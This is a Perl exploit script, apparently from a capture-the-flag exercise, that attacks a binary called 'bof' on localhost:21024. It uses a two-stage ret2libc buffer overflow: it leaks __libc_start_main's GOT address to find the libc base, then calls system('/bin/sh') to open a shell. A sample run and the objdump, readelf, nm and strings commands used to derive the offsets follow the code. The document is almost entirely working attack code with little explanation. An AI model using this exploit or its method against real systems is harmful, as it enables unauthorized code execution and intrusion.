# ret2libc
use lib qw (/opt/ctf/tools/ctf-tools/pwn/perl_pwntools);
use pwntools;
use Time::HiRes qw (usleep);
$lsm_offset = 0x19440;
$system_offset = 0x3f0b0;
$binsh_offset = 0x1636a0;

&connect(\$s, 'localhost', 21024) or die "ng";
# 1st stage
$buf = "A" x (300+int($ARGV[0]));
$buf.= p(0x8048460).p(0x8048470).p(1).p(0x804a01c).p(4)."\n"; #write(1,__libc_start_main@got,4) + restart
syswrite($s, $buf, length($buf));
usleep(400000);
sysread($s, $data, 0x4); 
$libc_base = u($data) - $lsm_offset;
printf("[+] libc_base = 0x%08x\n", $libc_base);
# 2nd stage
$buf = "A" x (300+int($ARGV[0]));
$buf.= p($libc_base+$system_offset).p(1).p($libc_base+$binsh_offset)."\n"; #system("/bin/sh")
syswrite($s, $buf, length($buf));
&interact($s);
__END__
# perl ret2libc.pl 19
[+] libc_base = 0xf7607000
cat flag
FLAG_GGGGGGGGGGGGG

$ objdump -d -Mintel bof
$ rodata2od bof
$ view bof.disas
08048470 <_start>:
08048460 <write@plt>:
08048410 <puts@plt>:
$ readelf -r bof
(snip)
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main
$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep __libc_star
00019440 T __libc_start_main
$ ldd bof
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7617000)
$ nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
0003f0b0 W system
$ strings -tx -a /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 1636a0 /bin/sh

